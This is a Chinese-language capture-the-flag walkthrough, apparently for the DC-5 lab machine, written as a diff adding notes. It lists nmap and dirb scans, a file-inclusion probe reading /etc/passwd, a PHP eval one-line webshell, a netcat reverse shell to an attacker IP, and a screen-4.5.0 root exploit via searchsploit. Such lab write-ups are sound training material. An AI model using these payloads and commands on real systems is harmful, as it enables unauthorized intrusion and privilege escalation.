@@ -1,0 +1,50 @@
+端口，主机信息扫描
+nmap -sV -A -p- 192.168.140.0/24
+发现主机开启两个tcp端口，80，111
+
+访问80端口
+一堆文章，感觉需要cewl生成密码字典
+
+dirb http://192.168.140.136
+目录扫描,有一个shapper.php
+
+打开发现是thankyou.php最下部的标志
+这两个标志总会随时间变动，所以想到了文件包含漏洞
+
+thankyou.php?file=/etc/passwd测试后发现真的存在
+
+burp抓包然后上传一句话木马
+<?php @eval($_POST['x']);?>
+用菜刀连接后将冰蝎的shell上传到/var/tmp目录下，利用冰蝎连接
+
+通过冰蝎命令行，利用netcat反弹shell
+靶机：nc 192.168.140.129 9999 -e /bin/bash
+kali：nc -lnvp 9999
+获得一个低权限的shell
+
+利用find查看有root权限的命令
+find / -perm -u=s -type f 2>/dev/null
+发现这里存在screen-4.5.0和exim4
+这两个第三方应用都可以用来提权
+
+这里先用screen，有时间用exim4试试
+
+首先利用searchspolit查找漏洞
+searchspolit screen-4.5.0
+利用-x查看详细信息，这里选择.sh漏洞信息
+searchsploit -x linux/local/41154.sh
+按照提示步骤，将代码放进三个文件。
+dc5.sh  libhax.so  rootshell
+
+利用冰蝎将三个文件上传到/tmp目录下
+
+回到kali反弹的shell这里，cd到目录
+cd /tmp
+首先给bc5.sh赋执行权限
+chmod +x dc5.sh
+有权限后运行dc5.sh获得root权限
+./dc5.sh
+
+cd到root用户
+发现最终flag
+结束
